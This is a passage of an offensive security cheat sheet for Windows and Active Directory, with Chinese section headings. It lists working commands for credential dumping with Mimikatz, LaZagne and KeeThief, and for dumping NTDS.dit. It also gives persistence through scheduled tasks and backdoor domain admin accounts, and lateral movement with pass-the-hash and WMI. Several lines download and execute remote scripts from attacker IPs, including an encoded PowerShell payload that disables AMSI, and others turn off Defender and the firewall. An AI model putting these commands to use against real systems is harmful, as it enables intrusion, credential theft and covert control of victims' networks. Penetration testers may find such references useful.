&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot; 4.19 检查AlwaysInstalledElevated注册表项12345reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedGet-ItemProperty HKLM\Software\Policies\Microsoft\Windows\InstallerGet-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installerreg query HKLM\Software\Policies\Microsoft\Windows\Installerreg query HKCU\Software\Policies\Microsoft\Windows\Installer 4.20 注册表中有密码吗？12reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s 4.21 剩余的任何Sysrep或无人参与文件123dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nulGet-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125; 4.22 GPP（组策略首选项）密码1234567smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For DecryptionCan also use PowerUP.ps1 4.23 转储Chrome密码（也发布漏洞利用程序）123456789101112131415#git clone https://github.com/rasta-mouse/CookieMonsterCookieMonster credsCookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.Can also use Mimikatz for this.mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotectmimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect 4.24 转储KeePass12345678910111213#https://github.com/HarmJ0y/KeeThief#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/Get-Process keepasstasklist | findstr keepassAttacking KeePass#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1Import-Module KeeThief.ps1Get-KeePassDatabaseKey -VerboseKeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used. 4.25 令牌模拟123456789101112131415161718https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)#Tokenvator https://github.com/0xbadjuju/TokenvatorReflectively Load it with Powershell, Cobalt, SilentTrinity etc...$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;[System.Reflection.Assembly]::Load($b) | Out-Null$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)[namespace.Class]::Main($parameters)Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra 4.26 多汁土豆123456789101112131415161718#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)#Reference https://ohpe.it/juicy-potato/Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.14.5:8000/JuicyPotato.exe&apos;,&apos;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&apos;)JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;Mochan.exe = Payload5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISDA CLSID is a GUID that identifies a COM class objectCan also use -A flag to specify arguments alongside cmd.exe/powershell.exe etcJUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL 4.27 烧烤1234567891011121314#Check my Blog Post Kerberos Attacks in Depth for Further Information#https://m0chan.github.io/Kerberos-Attacks-In-DepthGet-DomainSPNTicket -Credential $cred -OutputFormat hashcatbecause Hashcat over John anyday right?Invoke-Kerberoast.ps1python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccountOfc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action 4.28 用Python编写的1234567891011121314151617#https://github.com/skelsec/kerberoastIMPORTANT: the accepted formats are the following&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;Look for vulnerable users via LDAPkerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenumUse ASREP roast against users in the ldapenum_asrep_users.txt filekerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txtUse SPN roast against users in the ldapenum_spn_users.txt filekerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt 4.29 代表烘焙1234567#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerableGet-ASRepHash -Domain m0chanAD.local -User victimCan also use Rebeus (Reflectively Load .NET Assembly.).\Rubeus.exe asreproast 4.30DCSync（也用于后期利用）12345678910#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not allowed to pull password data for users by default. #and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)mimikatz # lsadump::dcsync /domain:corp.local /user:Administratorpowershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.6:8000/Invoke-DCSync.ps1&apos;); Invoke-DCSync -PWDumpFormat&quot;Empire Module: powershell/credentials/mimikatz/dcsync_hashdump 0x05 exploit后5.1 有用的命令12345678910111213141516171819202122net user m0chan /add /domainnet localgroup Administrators m0chan /add# Enable RDPreg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /fTurn firewall offnetsh firewall set opmode disableOr like thisreg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /fIf you get this error:CredSSP Error Fix -&gt;Add this reg key:reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /fDisable Windows DefenderSet-MpPreference -DisableRealtimeMonitoring $true 5.2 Esenutl.exe转储锁定文件1234C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10) 5.3 检查是否已启用Powershell日志记录12reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLoggingreg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription 5.4 Run Seatbelt（绝对必须）12345678910111213141516171819202122232425262728293031323334353637#https://github.com/GhostPack/SeatbeltThis is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win WinBasicOSInfo - Basic OS info (i.e. architecture, OS version, etc.)RebootSchedule - Reboot schedule (last 15 days) based on event IDs 12 and 13TokenGroupPrivs - Current process/token privileges (e.g. SeDebugPrivilege/etc.)UACSystemPolicies - UAC system policies via the registryPowerShellSettings - PowerShell versions and security settingsAuditSettings - Audit settings via the registryWEFSettings - Windows Event Forwarding (WEF) settings via the registryLSASettings - LSA settings (including auth packages)UserEnvVariables - Current user environment variablesSystemEnvVariables - Current system environment variablesUserFolders - Folders in C:\Users\NonstandardServices - Services with file info company names that don&apos;t contain &apos;Microsoft&apos;InternetSettings - Internet settings including proxy configsLapsSettings - LAPS settings, if installedLocalGroupMembers - Members of local admins, RDP, and DCOMMappedDrives - Mapped drivesRDPSessions - Current incoming RDP sessionsWMIMappedDrives - Mapped drives via WMINetworkShares - Network sharesFirewallRules - Deny firewall rules, &quot;full&quot; dumps allAntiVirusWMI - Registered antivirus (via WMI)InterestingProcesses - &quot;Interesting&quot; processes- defensive products and admin toolsRegistryAutoRuns - Registry autorunsRegistryAutoLogon - Registry autologon informationDNSCache - DNS cache entries (via WMI)ARPTable - Lists the current ARP table and adapter information (equivalent to arp -a)AllTcpConnections - Lists current TCP connections and associated processesAllUdpConnections - Lists current UDP connections and associated processesNonstandardProcesses - Running processeswith file info company names that don&apos;t contain &apos;Microsoft&apos; * If the user is in high integrity, the following additional actions are run:SysmonConfig - Sysmon configuration from the registryAnd more!! 5.5 Dump Creds1234567891011121314151617181920212223242526272829303132(new-object System.Net.WebClient).DownloadString(&apos;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.mimikatz.exeprivlege::debugsekurlsa::logonPasswords fullThe safer method is to dump the process memory of LSASS.exe with MiniDump (https://github.com/3xpl01tc0d3r/Minidump)(or) https://github.com/GhostPack/SharpDumpand send the .bin to Mimikatz locally.sekurlsa::minidump C:\users\m0chan\lssas.dmpCan also be used for dumping and pass the ticket attacks but will cover this elsewhere.Mimikatz Guide#Logon Sessionssekurlsa::logonPasswords all#Dump Cachelsadump::cache#Dump SAMlsadump::sam 5.6 Dump Creds #212345#https://github.com/AlessandroZ/LaZagnelaZagne.exe alllaZagne.exe browserslaZagne.exe browsers -firefox 5.7 SessionGopher12345678910#https://github.com/Arvanaghi/SessionGopherQuietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDPSessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminalsInvoke-SessionGopher -ThoroughImport-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss 5.8 Dump Chrome密码（也发布漏洞利用程序）123456789101112131415#git clone https://github.com/rasta-mouse/CookieMonsterCookieMonster credsCookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.Can also use Mimikatz for this.mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotectmimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect 5.9 Dump Process Memory w/ Mimikittenz1234567#https://github.com/putterpanda/mimikittenzmimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.Invoke-Mimikittenz 5.10 Dump KeePass12345678910111213#https://github.com/HarmJ0y/KeeThief#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/Get-Process keepasstasklist | findstr keepassAttacking KeePass#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1Import-Module KeeThief.ps1Get-KeePassDatabaseKey -VerboseKeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used. 5.11 pypykatz12345#https://github.com/skelsec/pypykatzFull python implementation of Mimikatz :D pip3 install pypykatz 5.12 SafetyKatz1234567#https://github.com/GhostPack/SafetyKatzFull C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D &quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&apos;s .NET PE Loader.First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot; 5.13 SharpDPAPI123#https://github.com/GhostPack/SharpDPAPIFull C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features. 5.14 SharpSniper123456789#https://github.com/HunnicCyber/SharpSniperOften a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.SharpSniper is a simple tool to find the IP address of these users so that you can target their box.C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123User: emusk - IP Address: 192.168.37.130 5.15 SharpLocker123#https://github.com/Pickfordmatt/SharpLockerSharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike. 5.16 Check for Missing KB’s12345678watson.exeSherlock.ps1Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)https://github.com/rasta-mouse/Watson 5.17 如果管理员/系统，则使用Mimikatz解密EFS文件123456789101112131415161718192021#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-filescipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.privilege::debug token::elevate crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /exportdpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80bopenssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pemopenssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pemopenssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfxcertutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot 5.18 UAC绕过123456789https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info findstr /C:&quot;&lt;autoElevate&gt;true&quot; C:\Windows\SysWOW64\SystemPropertiesAdvanced.exeC:\Windows\SysWOW64\SystemPropertiesComputerName.exeC:\Windows\SysWOW64\SystemPropertiesHardware.exeC:\Windows\SysWOW64\SystemPropertiesProtection.exeC:\Windows\SysWOW64\SystemPropertiesRemote.exe 5.19 Golden Ticket Attack1234567891011121314151617181920#Check my Blog Post Kerberos Attacks in Depth for Further Information#https://m0chan.github.io/Kerberos-Attacks-In-Depth# To generate the TGT with NTLMmimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;# To generate the TGT with AES 128 keymimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;# Inject TGT with Mimikatzmimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;#Inject Ticket with Rebeus.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd 5.20 子域将危害森林123456789101112131415161718192021222324252627Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DCTree = Set of domains using same name space (DNS Name)Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.Forest = Largest Structure composed of all trees.Most trees are linked with dual sided trust relationships to allow for sharing of resources.By default the first domain created if the Forest Root.Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create Covert-NameToSid target.domain.com\krbtgtS-1-5-21-2941561648-383941485-1389968811-502Replace 502 with 519 to represent Enterprise AdminsCreate golden ticket and attack parent domain. This will not work if there is SID Filtering in place for respective target domain.harmj0ys article explains it best. #http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ 5.21 Dump NTDS.dit123456789101112131415C:\vssadmin create shadow /for=C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit.copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM.copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM.reg SAVE HKLM\SYSTEM c:\SYSvssadmin delete shadows /for= [/oldest | /all | /shadow=]If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit 5.22 SeBackupPrivlege - Dump NTDS.dit12345678910111213141516171819Import-Module .\SeBackupPrivilegeCmdLets.dllImport-Module .\SeBackupPrivilegeUtils.dllPS C:\m0chan&gt; Get-SeBackupPrivilegeSeBackupPrivilege is disabledPS C:\m0chan&gt; Set-SeBackupPrivilegePS C:\m0chan&gt; Get-SeBackupPrivilegeSeBackupPrivilege is enabledPS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -OverwriteCopied 12582912 bytesUse diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit Remember and not use C:\Windows\ntds\ntds.ditreg.exe save hklm\system c:\m0chan\SYSTEM.bak 0x06 权限维持6.1 SSH Shuttle1./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot; 6.2 SharPersist1234567891011#https://github.com/fireeye/SharPersistC# Libary Designed by FireEye to aid with Persistance using various techniques such as KeePass BackdoorReg KeySch Task BackdoorStartup Folder (Link File)Service BackdoorSee there github linked above for full Syntax, very cool work 6.3 SharpDoor12345#https://github.com/infosecn1nja/SharpDoor.gitSharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe 6.4 自动运行注册表1234567891011[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce][HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon] 6.5 Run &amp; Run Once12reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot; 6.6 计划任务1234567891011121314#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exeThis will run Malware.exe every minute forever.# Run Malware.exe every day at 06:00amschtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00# Runs a task each time the user&apos;s session is idle for 5 minutes.schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5# Runs a a task as SYSTEM when User Logs in.schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon 6.7 Windows启动文件夹12345This has been around for years as basically every version of Windows contains a startup folder. Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUpCurrent User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 6.8 EXE / DLL劫持123Look for any missing DLL&apos;s or EXE&apos;s that common programs are calling on startup and over write them with your payload/malware.Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&apos;t break the execution. 6.9 添加用户帐号1234net user m0chan /add /domainnet group &quot;Domain Admins&quot; m0chan /add /domainnet localgroup &quot;Administrators&quot; /addnet user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot; 6.10 Kerberos的持久性123456789101112131415We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. They can be injected into session with mimikatz or Rebeus. But let&apos;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi SID is the domain SIDInject Ticketkerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbiCan also inject kirbi with Rebeus 0x07 横向运动7.1 Plink12345plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS#Windows 1803 Built in SSH Client (By Default)ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 7.2 Powershell端口转发12345678910netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toipPermanent ^^Requires iphlpsvc service to be enabledfromport: the port number to listen on, e.g. 80fromip: the ip address to listen on, e.g. 192.168.1.1toport: the port number to forward totoip: the ip address to forward to 7.3 Invoke-SocksProxy1234567891011121314151617181920212223242526272829#https://github.com/p3nt4/Invoke-SocksProxy/Local Socks4 Proxy on 1080Import-Module .\Invoke-SocksProxy.psm1Invoke-SocksProxy -bindPort 1080Reverse Socks Proxy on Remote Machine Port 1080# On the remote host: # Generate a private key and self signed certopenssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem# Get the certificate fingerprint to verify it:openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;# Start the handlerpython ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key# On the local host:Import-Module .\Invoke-SocksProxy.psm1Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 # Go through the system proxy:Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy# Validate certificateInvoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &apos;93061FDB30D69A435ACF96430744C5CC5473D44E&apos; 7.4 Socat for Windows12345678910111213141516#https://github.com/StudioEtrange/socat-windowsGenerate SSL Cert for Encryptionopenssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.keyServer : socat OPENSSL-LISTEN:443,cert=/cert.pem -Client : socat - OPENSSL:localhost:443#Port Forwardsocat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443All SSL Connections will be redirected to 202.54.1.5:443#Non SSL Port Forwardsocat TCP-LISTEN:80,fork TCP:202.54.1.5:80 7.5 SharpExec1234567891011#https://github.com/anthemtotheego/SharpExecC# Implementation of Conventional Lateral Movement Techniques, such as -WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&apos;s wmiexec.py tool.-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&apos;s smbexec.py tool.-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user. 7.6 安全套接字漏斗1234#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf#git clone https://github.com/securesocketfunneling/ssf.gitMassive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. 7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）1#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html 7.8 CrackMapExec1#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/ 7.9 WMIC Spawn Process1wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot; 7.10 WinRS123456789#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrswinrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt; winrs /r:https://contoso.com commandwinrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share 7.11 Invoke-WMIExec.ps112345Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d7b832fa -Command &quot;net user user pass /add /domain&quot;PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot; 7.12 Powershell调用命令（需要端口5985）1234$secpasswd = ConvertTo-SecureString &apos;pass&apos; -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential(&apos;m0chan\user&apos;, $secpasswd)Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125; 7.13 PSExec1psexec.exe \\dc01.m0chanAD.local cmd.exe 7.14 Powershell Remoting12345$secpasswd = ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential(&apos;WS02\USER&apos;, $secpasswd)$Session = New-PSSession -ComputerName FileServer -Credential $credEnter-PSSession $Session 7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）12345net use \\192.168.0.15 [password] /u:DOMAIN\m0chansc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;sc \\192.168.0.15 start &lt;service_name&gt; 7.16 Pass-The-Hash1234567891011crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x 